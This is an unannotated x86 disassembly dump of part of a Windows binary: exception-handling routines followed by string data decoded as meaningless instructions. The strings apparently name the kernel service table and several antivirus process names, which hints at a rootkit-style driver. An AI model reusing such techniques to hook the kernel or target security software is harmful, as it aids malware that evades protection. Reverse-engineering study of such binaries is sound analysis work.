   1a1a4:	jmp    DWORD PTR ds:0x1b14c
   1a1aa:	int3   
   1a1ab:	int3   
   1a1ac:	int3   
   1a1ad:	int3   
   1a1ae:	int3   
   1a1af:	int3   
   1a1b0:	jmp    DWORD PTR ds:0x1b158
   1a1b6:	int3   
   1a1b7:	int3   
   1a1b8:	int3   
   1a1b9:	int3   
   1a1ba:	int3   
   1a1bb:	int3   
   1a1bc:	jmp    DWORD PTR ds:0x1b1ac
   1a1c2:	int3   
   1a1c3:	int3   
   1a1c4:	int3   
   1a1c5:	int3   
   1a1c6:	int3   
   1a1c7:	int3   
   1a1c8:	push   0x1a230
   1a1cd:	push   DWORD PTR fs:0x0
   1a1d4:	mov    eax,DWORD PTR [esp+0x10]
   1a1d8:	mov    DWORD PTR [esp+0x10],ebp
   1a1dc:	lea    ebp,[esp+0x10]
   1a1e0:	sub    esp,eax
   1a1e2:	push   ebx
   1a1e3:	push   esi
   1a1e4:	push   edi
   1a1e5:	mov    eax,ds:0x1bb6c
   1a1ea:	xor    DWORD PTR [ebp-0x4],eax
   1a1ed:	xor    eax,ebp
   1a1ef:	push   eax
   1a1f0:	mov    DWORD PTR [ebp-0x18],esp
   1a1f3:	push   DWORD PTR [ebp-0x8]
   1a1f6:	mov    eax,DWORD PTR [ebp-0x4]
   1a1f9:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1a200:	mov    DWORD PTR [ebp-0x8],eax
   1a203:	lea    eax,[ebp-0x10]
   1a206:	mov    fs:0x0,eax
   1a20c:	ret    
   1a20d:	mov    ecx,DWORD PTR [ebp-0x10]
   1a210:	mov    DWORD PTR fs:0x0,ecx
   1a217:	pop    ecx
   1a218:	pop    edi
   1a219:	pop    edi
   1a21a:	pop    esi
   1a21b:	pop    ebx
   1a21c:	mov    esp,ebp
   1a21e:	pop    ebp
   1a21f:	push   ecx
   1a220:	ret    
   1a221:	int3   
   1a222:	int3   
   1a223:	int3   
   1a224:	int3   
   1a225:	int3   
   1a226:	int3   
   1a227:	int3   
   1a228:	int3   
   1a229:	int3   
   1a22a:	int3   
   1a22b:	int3   
   1a22c:	int3   
   1a22d:	int3   
   1a22e:	int3   
   1a22f:	int3   
   1a230:	mov    edi,edi
   1a232:	push   ebp
   1a233:	mov    ebp,esp
   1a235:	sub    esp,0x14
   1a238:	push   ebx
   1a239:	mov    ebx,DWORD PTR [ebp+0xc]
   1a23c:	push   esi
   1a23d:	mov    esi,DWORD PTR [ebx+0x8]
   1a240:	xor    esi,DWORD PTR ds:0x1bb6c
   1a246:	push   edi
   1a247:	mov    eax,DWORD PTR [esi]
   1a249:	cmp    eax,0xfffffffe
   1a24c:	mov    BYTE PTR [ebp-0x1],0x0
   1a250:	mov    DWORD PTR [ebp-0x8],0x1
   1a257:	lea    edi,[ebx+0x10]
   1a25a:	je     0x1a269
   1a25c:	mov    ecx,DWORD PTR [esi+0x4]
   1a25f:	add    ecx,edi
   1a261:	xor    ecx,DWORD PTR [eax+edi*1]
   1a264:	call   0x1a164
   1a269:	mov    ecx,DWORD PTR [esi+0xc]
   1a26c:	mov    eax,DWORD PTR [esi+0x8]
   1a26f:	add    ecx,edi
   1a271:	xor    ecx,DWORD PTR [eax+edi*1]
   1a274:	call   0x1a164
   1a279:	mov    eax,DWORD PTR [ebp+0x8]
   1a27c:	test   BYTE PTR [eax+0x4],0x66
   1a280:	jne    0x1a368
   1a286:	mov    ecx,DWORD PTR [ebp+0x10]
   1a289:	lea    edx,[ebp-0x14]
   1a28c:	mov    DWORD PTR [ebx-0x4],edx
   1a28f:	mov    ebx,DWORD PTR [ebx+0xc]
   1a292:	cmp    ebx,0xfffffffe
   1a295:	mov    DWORD PTR [ebp-0x14],eax
   1a298:	mov    DWORD PTR [ebp-0x10],ecx
   1a29b:	je     0x1a2fc
   1a29d:	lea    ecx,[ecx+0x0]
   1a2a0:	lea    eax,[ebx+ebx*2]
   1a2a3:	mov    ecx,DWORD PTR [esi+eax*4+0x14]
   1a2a7:	test   ecx,ecx
   1a2a9:	lea    eax,[esi+eax*4+0x10]
   1a2ad:	mov    DWORD PTR [ebp-0xc],eax
   1a2b0:	mov    eax,DWORD PTR [eax]
   1a2b2:	mov    DWORD PTR [ebp+0x8],eax
   1a2b5:	je     0x1a2cb
   1a2b7:	mov    edx,edi
   1a2b9:	call   0x1a4cd
   1a2be:	test   eax,eax
   1a2c0:	mov    BYTE PTR [ebp-0x1],0x1
   1a2c4:	jl     0x1a306
   1a2c6:	jg     0x1a30f
   1a2c8:	mov    eax,DWORD PTR [ebp+0x8]
   1a2cb:	cmp    eax,0xfffffffe
   1a2ce:	mov    ebx,eax
   1a2d0:	jne    0x1a2a0
   1a2d2:	cmp    BYTE PTR [ebp-0x1],0x0
   1a2d6:	je     0x1a2fc
   1a2d8:	mov    eax,DWORD PTR [esi]
   1a2da:	cmp    eax,0xfffffffe
   1a2dd:	je     0x1a2ec
   1a2df:	mov    ecx,DWORD PTR [esi+0x4]
   1a2e2:	add    ecx,edi
   1a2e4:	xor    ecx,DWORD PTR [eax+edi*1]
   1a2e7:	call   0x1a164
   1a2ec:	mov    ecx,DWORD PTR [esi+0xc]
   1a2ef:	mov    edx,DWORD PTR [esi+0x8]
   1a2f2:	add    ecx,edi
   1a2f4:	xor    ecx,DWORD PTR [edx+edi*1]
   1a2f7:	call   0x1a164
   1a2fc:	mov    eax,DWORD PTR [ebp-0x8]
   1a2ff:	pop    edi
   1a300:	pop    esi
   1a301:	pop    ebx
   1a302:	mov    esp,ebp
   1a304:	pop    ebp
   1a305:	ret    
   1a306:	mov    DWORD PTR [ebp-0x8],0x0
   1a30d:	jmp    0x1a2d8
   1a30f:	mov    ecx,DWORD PTR [ebp+0xc]
   1a312:	call   0x1a4f6
   1a317:	mov    eax,DWORD PTR [ebp+0xc]
   1a31a:	cmp    DWORD PTR [eax+0xc],ebx
   1a31d:	je     0x1a331
   1a31f:	push   0x1bb6c
   1a324:	push   edi
   1a325:	mov    edx,ebx
   1a327:	mov    ecx,eax
   1a329:	call   0x1a510
   1a32e:	mov    eax,DWORD PTR [ebp+0xc]
   1a331:	mov    ecx,DWORD PTR [ebp+0x8]
   1a334:	mov    DWORD PTR [eax+0xc],ecx
   1a337:	mov    eax,DWORD PTR [esi]
   1a339:	cmp    eax,0xfffffffe
   1a33c:	je     0x1a34b
   1a33e:	mov    ecx,DWORD PTR [esi+0x4]
   1a341:	add    ecx,edi
   1a343:	xor    ecx,DWORD PTR [eax+edi*1]
   1a346:	call   0x1a164
   1a34b:	mov    ecx,DWORD PTR [esi+0xc]
   1a34e:	mov    edx,DWORD PTR [esi+0x8]
   1a351:	add    ecx,edi
   1a353:	xor    ecx,DWORD PTR [edx+edi*1]
   1a356:	call   0x1a164
   1a35b:	mov    eax,DWORD PTR [ebp-0xc]
   1a35e:	mov    ecx,DWORD PTR [eax+0x8]
   1a361:	mov    edx,edi
   1a363:	jmp    0x1a4e4
   1a368:	mov    edx,0xfffffffe
   1a36d:	cmp    DWORD PTR [ebx+0xc],edx
   1a370:	je     0x1a2fc
   1a372:	push   0x1bb6c
   1a377:	push   edi
   1a378:	mov    ecx,ebx
   1a37a:	call   0x1a510
   1a37f:	jmp    0x1a2d8
   1a384:	int3   
   1a385:	int3   
   1a386:	int3   
   1a387:	int3   
   1a388:	int3   
   1a389:	int3   
   1a38a:	int3   
   1a38b:	int3   
   1a38c:	push   0x1a230
   1a391:	push   DWORD PTR fs:0x0
   1a398:	mov    eax,DWORD PTR [esp+0x10]
   1a39c:	mov    DWORD PTR [esp+0x10],ebp
   1a3a0:	lea    ebp,[esp+0x10]
   1a3a4:	sub    esp,eax
   1a3a6:	push   ebx
   1a3a7:	push   esi
   1a3a8:	push   edi
   1a3a9:	mov    eax,ds:0x1bb6c
   1a3ae:	xor    DWORD PTR [ebp-0x4],eax
   1a3b1:	xor    eax,ebp
   1a3b3:	mov    DWORD PTR [ebp-0x1c],eax
   1a3b6:	push   eax
   1a3b7:	mov    DWORD PTR [ebp-0x18],esp
   1a3ba:	push   DWORD PTR [ebp-0x8]
   1a3bd:	mov    eax,DWORD PTR [ebp-0x4]
   1a3c0:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1a3c7:	mov    DWORD PTR [ebp-0x8],eax
   1a3ca:	lea    eax,[ebp-0x10]
   1a3cd:	mov    fs:0x0,eax
   1a3d3:	ret    
   1a3d4:	mov    ecx,DWORD PTR [ebp-0x1c]
   1a3d7:	xor    ecx,ebp
   1a3d9:	call   0x1a164
   1a3de:	jmp    0x1a20d
   1a3e3:	int3   
   1a3e4:	int3   
   1a3e5:	int3   
   1a3e6:	int3   
   1a3e7:	int3   
   1a3e8:	push   ebx
   1a3e9:	push   esi
   1a3ea:	push   edi
   1a3eb:	mov    edx,DWORD PTR [esp+0x10]
   1a3ef:	mov    eax,DWORD PTR [esp+0x14]
   1a3f3:	mov    ecx,DWORD PTR [esp+0x18]
   1a3f7:	push   ebp
   1a3f8:	push   edx
   1a3f9:	push   eax
   1a3fa:	push   ecx
   1a3fb:	push   ecx
   1a3fc:	push   0x1a46b
   1a401:	push   DWORD PTR fs:0x0
   1a408:	mov    eax,ds:0x1bb6c
   1a40d:	xor    eax,esp
   1a40f:	mov    DWORD PTR [esp+0x8],eax
   1a413:	mov    DWORD PTR fs:0x0,esp
   1a41a:	mov    eax,DWORD PTR [esp+0x30]
   1a41e:	mov    ebx,DWORD PTR [eax+0x8]
   1a421:	mov    ecx,DWORD PTR [esp+0x2c]
   1a425:	xor    ebx,DWORD PTR [ecx]
   1a427:	mov    esi,DWORD PTR [eax+0xc]
   1a42a:	cmp    esi,0xfffffffe
   1a42d:	je     0x1a45d
   1a42f:	mov    edx,DWORD PTR [esp+0x34]
   1a433:	cmp    edx,0xfffffffe
   1a436:	je     0x1a43c
   1a438:	cmp    esi,edx
   1a43a:	jbe    0x1a45d
   1a43c:	lea    esi,[esi+esi*2]
   1a43f:	lea    ebx,[ebx+esi*4+0x10]
   1a443:	mov    ecx,DWORD PTR [ebx]
   1a445:	mov    DWORD PTR [eax+0xc],ecx
   1a448:	cmp    DWORD PTR [ebx+0x4],0x0
   1a44c:	jne    0x1a41a
   1a44e:	mov    ecx,0x1
   1a453:	mov    eax,DWORD PTR [ebx+0x8]
   1a456:	call   0x1a52c
   1a45b:	jmp    0x1a41a
   1a45d:	pop    DWORD PTR fs:0x0
   1a464:	add    esp,0x18
   1a467:	pop    edi
   1a468:	pop    esi
   1a469:	pop    ebx
   1a46a:	ret    
   1a46b:	mov    ecx,DWORD PTR [esp+0x4]
   1a46f:	test   DWORD PTR [ecx+0x4],0x6
   1a476:	mov    eax,0x1
   1a47b:	je     0x1a4b0
   1a47d:	mov    eax,DWORD PTR [esp+0x8]
   1a481:	mov    ecx,DWORD PTR [eax+0x8]
   1a484:	xor    ecx,eax
   1a486:	call   0x1a164
   1a48b:	push   ebp
   1a48c:	mov    ebp,DWORD PTR [eax+0x18]
   1a48f:	push   DWORD PTR [eax+0xc]
   1a492:	push   DWORD PTR [eax+0x10]
   1a495:	push   DWORD PTR [eax+0x14]
   1a498:	call   0x1a3e8
   1a49d:	add    esp,0xc
   1a4a0:	pop    ebp
   1a4a1:	mov    eax,DWORD PTR [esp+0x8]
   1a4a5:	mov    edx,DWORD PTR [esp+0x10]
   1a4a9:	mov    DWORD PTR [edx],eax
   1a4ab:	mov    eax,0x3
   1a4b0:	ret    
   1a4b1:	push   ebp
   1a4b2:	mov    ecx,DWORD PTR [esp+0x8]
   1a4b6:	mov    ebp,DWORD PTR [ecx]
   1a4b8:	push   DWORD PTR [ecx+0x1c]
   1a4bb:	push   DWORD PTR [ecx+0x18]
   1a4be:	push   DWORD PTR [ecx+0x28]
   1a4c1:	call   0x1a3e8
   1a4c6:	add    esp,0xc
   1a4c9:	pop    ebp
   1a4ca:	ret    0x4
   1a4cd:	push   ebp
   1a4ce:	push   esi
   1a4cf:	push   edi
   1a4d0:	push   ebx
   1a4d1:	mov    ebp,edx
   1a4d3:	xor    eax,eax
   1a4d5:	xor    ebx,ebx
   1a4d7:	xor    edx,edx
   1a4d9:	xor    esi,esi
   1a4db:	xor    edi,edi
   1a4dd:	call   ecx
   1a4df:	pop    ebx
   1a4e0:	pop    edi
   1a4e1:	pop    esi
   1a4e2:	pop    ebp
   1a4e3:	ret    
   1a4e4:	mov    ebp,edx
   1a4e6:	mov    esi,ecx
   1a4e8:	mov    eax,ecx
   1a4ea:	xor    eax,eax
   1a4ec:	xor    ebx,ebx
   1a4ee:	xor    ecx,ecx
   1a4f0:	xor    edx,edx
   1a4f2:	xor    edi,edi
   1a4f4:	jmp    esi
   1a4f6:	push   ebp
   1a4f7:	mov    ebp,esp
   1a4f9:	push   ebx
   1a4fa:	push   esi
   1a4fb:	push   edi
   1a4fc:	push   0x0
   1a4fe:	push   0x0
   1a500:	push   0x1a50b
   1a505:	push   ecx
   1a506:	call   0x1a534
   1a50b:	pop    edi
   1a50c:	pop    esi
   1a50d:	pop    ebx
   1a50e:	pop    ebp
   1a50f:	ret    
   1a510:	push   ebp
   1a511:	mov    ebp,DWORD PTR [esp+0x8]
   1a515:	push   edx
   1a516:	push   ecx
   1a517:	push   DWORD PTR [esp+0x14]
   1a51b:	call   0x1a3e8
   1a520:	add    esp,0xc
   1a523:	pop    ebp
   1a524:	ret    0x8
   1a527:	int3   
   1a528:	int3   
   1a529:	int3   
   1a52a:	int3   
   1a52b:	int3   
   1a52c:	call   eax
   1a52e:	ret    
   1a52f:	int3   
   1a530:	int3   
   1a531:	int3   
   1a532:	int3   
   1a533:	int3   
   1a534:	jmp    DWORD PTR ds:0x1b288
   1a53a:	dec    ebx
   1a53b:	gs push ebx
   1a53d:	gs jb  0x1a5b6
   1a540:	imul   esp,DWORD PTR [ebx+0x65],0x63736544
   1a547:	jb     0x1a5b2
   1a549:	jo     0x1a5bf
   1a54b:	outs   dx,DWORD PTR ds:[esi]
   1a54c:	jb     0x1a5a2
   1a54e:	popa   
   1a54f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
   1a553:	int3   
   1a554:	pop    esp
   1a555:	add    BYTE PTR [ebx+0x0],dl
   1a558:	jns    0x1a55a
   1a55a:	jae    0x1a55c
   1a55c:	je     0x1a55e
   1a55e:	add    BYTE PTR gs:[ebp+0x0],ch
   1a562:	push   edx
   1a563:	add    BYTE PTR [edi+0x0],ch
   1a566:	outs   dx,DWORD PTR ds:[esi]
   1a567:	add    BYTE PTR [eax+eax*1+0x5c],dh
   1a56b:	add    BYTE PTR [ebx+0x0],dl
   1a56e:	jns    0x1a570
   1a570:	jae    0x1a572
   1a572:	je     0x1a574
   1a574:	add    BYTE PTR gs:[ebp+0x0],ch
   1a578:	xor    eax,DWORD PTR [eax]
   1a57a:	xor    al,BYTE PTR [eax]
   1a57c:	pop    esp
   1a57d:	add    BYTE PTR [esi+0x0],ch
   1a580:	je     0x1a582
   1a582:	outs   dx,DWORD PTR ds:[esi]
   1a583:	add    BYTE PTR [ebx+0x0],dh
   1a586:	imul   eax,DWORD PTR [eax],0x72
   1a589:	add    BYTE PTR [esi+0x0],ch
   1a58c:	ins    BYTE PTR es:[edi],dx
   1a58d:	add    BYTE PTR [esi],ch
   1a58f:	add    BYTE PTR [ebp+0x0],ah
   1a592:	js     0x1a594
   1a594:	add    BYTE PTR gs:[eax],al
   1a597:	add    BYTE PTR [esi],ch
   1a599:	gs js  0x1a601
   1a59c:	add    ah,cl
   1a59e:	and    eax,0x2a006400
   1a5a3:	add    BYTE PTR ds:0x2a007300,ah
   1a5a9:	add    BYTE PTR ds:0x38003000,ah
   1a5af:	add    BYTE PTR [eax+0x0],bl
   1a5b2:	add    BYTE PTR [eax],al
   1a5b4:	inc    edx
   1a5b5:	add    BYTE PTR [eax+eax*1+0x49],cl
   1a5b9:	add    BYTE PTR [esi+0x0],ch
   1a5bc:	imul   eax,DWORD PTR [eax],0x250074
   1a5c2:	add    BYTE PTR fs:[eax],al
   1a5c5:	add    BYTE PTR [eax+eax*1+0x53],bl
   1a5c9:	add    BYTE PTR [ecx+0x0],bh
   1a5cc:	jae    0x1a5ce
   1a5ce:	je     0x1a5d0
   1a5d0:	add    BYTE PTR gs:[ebp+0x0],ch
   1a5d4:	xor    eax,DWORD PTR [eax]
   1a5d6:	xor    al,BYTE PTR [eax]
   1a5d8:	add    BYTE PTR [eax],al
   1a5da:	pop    esp
   1a5db:	add    BYTE PTR [ebx+0x0],dl
   1a5de:	jns    0x1a5e0
   1a5e0:	jae    0x1a5e2
   1a5e2:	je     0x1a5e4
   1a5e4:	add    BYTE PTR gs:[ebp+0x0],ch
   1a5e8:	push   edx
   1a5e9:	add    BYTE PTR [edi+0x0],ch
   1a5ec:	outs   dx,DWORD PTR ds:[esi]
   1a5ed:	add    BYTE PTR [eax+eax*1+0x0],dh
   1a5f1:	add    BYTE PTR [eax+eax*1+0x50],bl
   1a5f5:	add    BYTE PTR [ecx+0x0],ah
   1a5f8:	jb     0x1a5fa
   1a5fa:	je     0x1a5fc
   1a5fc:	imul   eax,DWORD PTR [eax],0x690074
   1a602:	outs   dx,DWORD PTR ds:[esi]
   1a603:	add    BYTE PTR [esi+0x0],ch
   1a606:	add    BYTE PTR [eax],al
   1a608:	pop    esp
   1a609:	add    BYTE PTR [eax+eax*1+0x65],al
   1a60d:	add    BYTE PTR [esi+0x0],dh
   1a610:	imul   eax,DWORD PTR [eax],0x650063
   1a616:	pop    esp
   1a617:	add    BYTE PTR [eax],al
   1a619:	add    BYTE PTR [eax+eax*1+0x53],bl
   1a61d:	add    BYTE PTR [ecx+0x0],bh
   1a620:	jae    0x1a622
   1a622:	je     0x1a624
   1a624:	add    BYTE PTR gs:[ebp+0x0],ch
   1a628:	push   edx
   1a629:	add    BYTE PTR [edi+0x0],ch
   1a62c:	outs   dx,DWORD PTR ds:[esi]
   1a62d:	add    BYTE PTR [eax+eax*1+0x5c],dh
   1a631:	add    BYTE PTR [eax],al
   1a633:	add    BYTE PTR [eax+eax*1+0x3f],bl
   1a637:	add    BYTE PTR [edi],bh
   1a639:	add    BYTE PTR [eax+eax*1+0x0],bl
   1a63d:	add    BYTE PTR [eax+eax*1+0x44],bl
   1a641:	add    BYTE PTR [ebp+0x0],ah
   1a644:	jbe    0x1a646
   1a646:	imul   eax,DWORD PTR [eax],0x650063
   1a64c:	pop    esp
   1a64d:	add    BYTE PTR [eax+0x0],cl
   1a650:	popa   
   1a651:	add    BYTE PTR [edx+0x0],dh
   1a654:	add    BYTE PTR fs:[eax+eax*1+0x69],ah
   1a659:	add    BYTE PTR [ebx+0x0],dh
   1a65c:	imul   eax,DWORD PTR [eax],0x0
   1a65f:	add    BYTE PTR [eax+eax*1+0x3f],bl
   1a663:	add    BYTE PTR [edi],bh
   1a665:	add    BYTE PTR [eax+eax*1+0x58],bl
   1a669:	add    BYTE PTR [edx],bh
   1a66b:	add    BYTE PTR [eax],al
   1a66d:	add    BYTE PTR [eax+eax*1+0x44],bl
   1a671:	add    BYTE PTR [ebp+0x0],ah
   1a674:	jbe    0x1a676
   1a676:	imul   eax,DWORD PTR [eax],0x650063
   1a67c:	pop    esp
   1a67d:	add    BYTE PTR [eax+0x0],cl
   1a680:	popa   
   1a681:	add    BYTE PTR [edx+0x0],dh
   1a684:	add    BYTE PTR fs:[eax+eax*1+0x69],ah
   1a689:	add    BYTE PTR [ebx+0x0],dh
   1a68c:	imul   eax,DWORD PTR [eax],0x56
   1a68f:	add    BYTE PTR [edi+0x0],ch
   1a692:	ins    BYTE PTR es:[edi],dx
   1a693:	add    BYTE PTR [ebp+0x0],dh
   1a696:	ins    DWORD PTR es:[edi],dx
   1a697:	add    BYTE PTR [ebp+0x0],ah
   1a69a:	add    BYTE PTR [eax],al
   1a69c:	gs js  0x1a70f
   1a69f:	ins    BYTE PTR es:[edi],dx
   1a6a0:	outs   dx,DWORD PTR ds:[esi]
   1a6a1:	jb     0x1a708
   1a6a3:	jb     0x1a6d3
   1a6a5:	gs js  0x1a70d
   1a6a8:	add    ah,cl
   1a6aa:	add    BYTE PTR gs:[eax+0x0],bh
   1a6ae:	jo     0x1a6b0
   1a6b0:	ins    BYTE PTR es:[edi],dx
   1a6b1:	add    BYTE PTR [edi+0x0],ch
   1a6b4:	jb     0x1a6b6
   1a6b6:	add    BYTE PTR gs:[edx+0x0],dh
   1a6ba:	add    BYTE PTR cs:[ebp+0x0],ah
   1a6be:	js     0x1a6c0
   1a6c0:	add    BYTE PTR gs:[eax],al
   1a6c3:	add    BYTE PTR [esi],ch
   1a6c5:	add    BYTE PTR [ebp+0x0],ah
   1a6c8:	js     0x1a6ca
   1a6ca:	add    BYTE PTR gs:[eax],al
   1a6cd:	add    BYTE PTR [ecx+0x0],ch
   1a6d0:	arpl   WORD PTR [eax],ax
   1a6d2:	ins    DWORD PTR es:[edi],dx
   1a6d3:	add    BYTE PTR [edi+0x0],ch
   1a6d6:	outs   dx,BYTE PTR ds:[esi]
   1a6d7:	add    BYTE PTR [esi],ch
   1a6d9:	add    BYTE PTR [ebp+0x0],ah
   1a6dc:	js     0x1a6de
   1a6de:	add    BYTE PTR gs:[eax],al
   1a6e1:	add    BYTE PTR [ebx+0x0],ah
   1a6e4:	arpl   WORD PTR [eax],ax
   1a6e6:	ins    BYTE PTR es:[edi],dx
   1a6e7:	add    BYTE PTR [ecx+0x0],ah
   1a6ea:	ja     0x1a6ec
   1a6ec:	add    BYTE PTR cs:[ebp+0x0],ah
   1a6f0:	js     0x1a6f2
   1a6f2:	add    BYTE PTR gs:[eax],al
   1a6f5:	add    BYTE PTR [eax+0x0],dh
   1a6f8:	popa   
   1a6f9:	add    BYTE PTR [esi+0x0],dh
   1a6fc:	data16 add BYTE PTR [esi+0x0],ch
   1a700:	jae    0x1a702
   1a702:	jbe    0x1a704
   1a704:	jb     0x1a706
   1a706:	add    BYTE PTR cs:[ebp+0x0],ah
   1a70a:	js     0x1a70c
   1a70c:	add    BYTE PTR gs:[eax],al
   1a70f:	add    BYTE PTR [ecx+0x0],ch
   1a712:	outs   dx,BYTE PTR ds:[esi]
   1a713:	add    BYTE PTR [ebp+0x0],ah
   1a716:	je     0x1a718
   1a718:	jne    0x1a71a
   1a71a:	jo     0x1a71c
   1a71c:	add    BYTE PTR fs:[esi],ch
   1a71f:	add    BYTE PTR [ebp+0x0],ah
   1a722:	js     0x1a724
   1a724:	add    BYTE PTR gs:[eax],al
   1a727:	add    BYTE PTR [edx+0x0],dh
   1a72a:	outs   dx,DWORD PTR ds:[esi]
   1a72b:	add    BYTE PTR [edi+0x0],ch
   1a72e:	je     0x1a730
   1a730:	imul   eax,DWORD PTR [eax],0x69
   1a733:	add    BYTE PTR [eax+eax*1+0x5f],dh
   1a737:	add    BYTE PTR [eax+eax*1+0x65],ah
   1a73b:	add    BYTE PTR [eax+eax*1+0x65],dh
   1a73f:	add    BYTE PTR [ebx+0x0],ah
   1a742:	je     0x1a744
   1a744:	imul   eax,DWORD PTR [eax],0x650076
   1a74a:	add    BYTE PTR cs:[ebp+0x0],ah
   1a74e:	js     0x1a750
   1a750:	add    BYTE PTR gs:[eax],al
   1a753:	add    BYTE PTR [edx+0x0],dh
   1a756:	outs   dx,DWORD PTR ds:[esi]
   1a757:	add    BYTE PTR [edi+0x0],ch
   1a75a:	je     0x1a75c
   1a75c:	imul   eax,DWORD PTR [eax],0x69
   1a75f:	add    BYTE PTR [eax+eax*1+0x72],dh
   1a763:	add    BYTE PTR [ebp+0x0],ah
   1a766:	jbe    0x1a768
   1a768:	add    BYTE PTR gs:[ecx+0x0],ah
   1a76c:	ins    BYTE PTR es:[edi],dx
   1a76d:	add    BYTE PTR [ebp+0x0],ah
   1a770:	jb     0x1a772
   1a772:	add    BYTE PTR cs:[ebp+0x0],ah
   1a776:	js     0x1a778
   1a778:	add    BYTE PTR gs:[eax],al
   1a77b:	add    BYTE PTR [edx+0x0],dh
   1a77e:	imul   eax,DWORD PTR [eax],0x68
   1a781:	add    BYTE PTR [eax+eax*1+0x72],ah
   1a785:	add    BYTE PTR [esi+0x0],dh
   1a788:	xor    al,0x0
   1a78a:	xor    BYTE PTR [eax],al
   1a78c:	add    BYTE PTR cs:[ebx+0x0],dh
   1a790:	jns    0x1a792
   1a792:	jae    0x1a794
   1a794:	add    BYTE PTR [eax],al
   1a796:	popa   
   1a797:	add    BYTE PTR [esi+0x0],dh
   1a79a:	add    BYTE PTR [bx+di+0x0],ah
   1a79e:	jb     0x1a7a0
   1a7a0:	imul   eax,DWORD PTR [eax],0x74
   1a7a3:	add    BYTE PTR [esi],ch
   1a7a5:	add    BYTE PTR [ebp+0x0],ah
   1a7a8:	js     0x1a7aa
   1a7aa:	add    BYTE PTR gs:[eax],al
   1a7ad:	add    BYTE PTR [ecx+0x0],al
   1a7b0:	jbe    0x1a7b2
   1a7b2:	add    BYTE PTR [bx+di+0x0],al
   1a7b6:	jb     0x1a7b8
   1a7b8:	inc    ebx
   1a7b9:	add    BYTE PTR [eax+eax*1+0x6e],ch
   1a7bd:	add    BYTE PTR [esi],ch
   1a7bf:	add    BYTE PTR [ebx+0x0],dh
   1a7c2:	jns    0x1a7c4
   1a7c4:	jae    0x1a7c6
   1a7c6:	add    BYTE PTR [eax],al
   1a7c8:	popa   
   1a7c9:	add    BYTE PTR [esi+0x0],dh
   1a7cc:	add    BYTE PTR [bx+di+0x0],ah
   1a7d0:	jb     0x1a7d2
   1a7d2:	imul   eax,DWORD PTR [eax],0x74
   1a7d5:	add    BYTE PTR [esi],ch
   1a7d7:	add    BYTE PTR [ebx+0x0],dh
   1a7da:	jns    0x1a7dc
   1a7dc:	jae    0x1a7de
   1a7de:	add    BYTE PTR [eax],al
   1a7e0:	popa   
   1a7e1:	add    BYTE PTR [esi+0x0],dh
   1a7e4:	jp     0x1a7e6
   1a7e6:	add    BYTE PTR cs:[ebp+0x0],ah
   1a7ea:	js     0x1a7ec
   1a7ec:	add    BYTE PTR gs:[eax],al
   1a7ef:	add    BYTE PTR [eax+eax*1+0x69],ch
   1a7f3:	add    BYTE PTR [esi+0x0],dh
   1a7f6:	add    BYTE PTR gs:[ebx+0x0],dh
   1a7fa:	jb     0x1a7fc
   1a7fc:	jbe    0x1a7fe
   1a7fe:	add    BYTE PTR cs:[ebp+0x0],ah
   1a802:	js     0x1a804
   1a804:	add    BYTE PTR gs:[eax],al
   1a807:	add    BYTE PTR [edx+0x0],ah
   1a80a:	add    BYTE PTR fs:[ebp+0x0],ch
   1a80e:	arpl   WORD PTR [eax],ax
   1a810:	outs   dx,DWORD PTR ds:[esi]
   1a811:	add    BYTE PTR [esi+0x0],ch
   1a814:	add    BYTE PTR cs:[ebp+0x0],ah
   1a818:	js     0x1a81a
   1a81a:	add    BYTE PTR gs:[eax],al
   1a81d:	add    BYTE PTR [edx+0x0],ah
   1a820:	add    BYTE PTR fs:[ebx+0x0],dh
   1a824:	jae    0x1a826
   1a826:	add    BYTE PTR cs:[ebp+0x0],ah
   1a82a:	js     0x1a82c
   1a82c:	add    BYTE PTR gs:[eax],al
   1a82f:	add    BYTE PTR [ebx+0x0],dh
   1a832:	popa   
   1a833:	add    BYTE PTR [esi+0x0],dh
   1a836:	jae    0x1a838
   1a838:	arpl   WORD PTR [eax],ax
   1a83a:	popa   
   1a83b:	add    BYTE PTR [esi+0x0],ch
   1a83e:	add    BYTE PTR cs:[ebp+0x0],ah
   1a842:	js     0x1a844
   1a844:	add    BYTE PTR gs:[eax],al
   1a847:	add    BYTE PTR [edx+0x0],dh
   1a84a:	je     0x1a84c
   1a84c:	jbe    0x1a84e
   1a84e:	jae    0x1a850
   1a850:	arpl   WORD PTR [eax],ax
   1a852:	popa   
   1a853:	add    BYTE PTR [esi+0x0],ch
   1a856:	add    BYTE PTR cs:[ebp+0x0],ah
   1a85a:	js     0x1a85c
   1a85c:	add    BYTE PTR gs:[eax],al
   1a85f:	add    BYTE PTR [ecx+0x0],ch
   1a862:	jae    0x1a864
   1a864:	jae    0x1a866
   1a866:	jbe    0x1a868
   1a868:	arpl   WORD PTR [eax],ax
   1a86a:	add    BYTE PTR cs:[ebp+0x0],ah
   1a86e:	js     0x1a870
   1a870:	add    BYTE PTR gs:[eax],al
   1a873:	add    BYTE PTR [ecx+0x0],ch
   1a876:	popa   
   1a877:	add    BYTE PTR [edi+0x0],ch
   1a87a:	add    BYTE PTR cs:[ebp+0x0],ah
   1a87e:	js     0x1a880
   1a880:	add    BYTE PTR gs:[eax],al
   1a883:	add    BYTE PTR [ebx+0x0],ah
   1a886:	arpl   WORD PTR [eax],ax
   1a888:	popa   
   1a889:	add    BYTE PTR [eax+0x0],dh
   1a88c:	jo     0x1a88e
   1a88e:	add    BYTE PTR cs:[ebp+0x0],ah
   1a892:	js     0x1a894
   1a894:	add    BYTE PTR gs:[eax],al
   1a897:	add    BYTE PTR [ebx+0x0],ah
   1a89a:	arpl   WORD PTR [eax],ax
   1a89c:	jo     0x1a89e
   1a89e:	js     0x1a8a0
   1a8a0:	jns    0x1a8a2
   1a8a2:	jae    0x1a8a4
   1a8a4:	jbe    0x1a8a6
   1a8a6:	arpl   WORD PTR [eax],ax
   1a8a8:	add    BYTE PTR cs:[ebp+0x0],ah
   1a8ac:	js     0x1a8ae
   1a8ae:	add    BYTE PTR gs:[eax],al
   1a8b1:	add    BYTE PTR [ebx+0x0],ah
   1a8b4:	arpl   WORD PTR [eax],ax
   1a8b6:	add    BYTE PTR gs:[esi+0x0],dh
   1a8ba:	je     0x1a8bc
   1a8bc:	ins    DWORD PTR es:[edi],dx
   1a8bd:	add    BYTE PTR [edi+0x0],ah
   1a8c0:	jb     0x1a8c2
   1a8c2:	add    BYTE PTR cs:[ebp+0x0],ah
